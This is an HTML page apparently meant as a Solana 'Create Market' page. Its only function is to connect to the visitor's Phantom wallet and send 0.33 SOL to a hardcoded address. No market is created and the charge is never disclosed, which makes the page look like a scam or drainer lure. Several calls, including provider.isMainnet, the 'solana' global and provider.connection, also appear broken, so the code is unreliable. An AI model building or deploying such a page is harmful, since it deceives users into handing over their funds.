<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Create Market</title>
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
</head>
<body>
    <button id="createMarketBtn">Create Market</button>

    <script>
        const createMarket = async () => {
            try {
                const provider = await getProvider();
                const publicKey = provider.publicKey;
                const recipientAddress = '9gVBpxceotiFdh8o9arz5KJ4PgSZd7KoiN2aLqaGUDar'; // Replace with the recipient wallet address

                console.log("Creating transaction...");

                // Check if connected to the mainnet
                if (provider.isMainnet) {
                    // Create a transaction
                    const transaction = new solana.Transaction().add(
                        solana.SystemProgram.transfer({
                            fromPubkey: publicKey,
                            toPubkey: new solana.PublicKey(recipientAddress),
                            lamports: solana.LAMPORTS_PER_SOL * 0.33, // 0.33 SOL
                        })
                    );

                    console.log("Transaction created:", transaction);

                    // Sign the transaction
                    const signedTransaction = await provider.signTransaction(transaction);
                    console.log("Transaction signed:", signedTransaction);

                    // Send the signed transaction
                    const signature = await solana.sendAndConfirmRawTransaction(
                        provider.connection,
                        signedTransaction.serialize()
                    );

                    console.log("Transaction successful with signature:", signature);
                } else {
                    console.error("Please connect to the Solana mainnet.");
                }
            } catch (error) {
                console.error("Error:", error);
            }
        };

        const getProvider = async () => {
            if ("solana" in window) {
                await window.solana.connect();
                const provider = window.solana;
                if (provider.isPhantom) {
                    return provider;
                }
            } else {
                throw new Error("Phantom Wallet is not installed. Please install it to create the market.");
            }
        };

        window.onload = () => {
            const createMarketBtn = document.getElementById('createMarketBtn');
            createMarketBtn.addEventListener('click', createMarket);
        };
    </script>
</body>
</html>
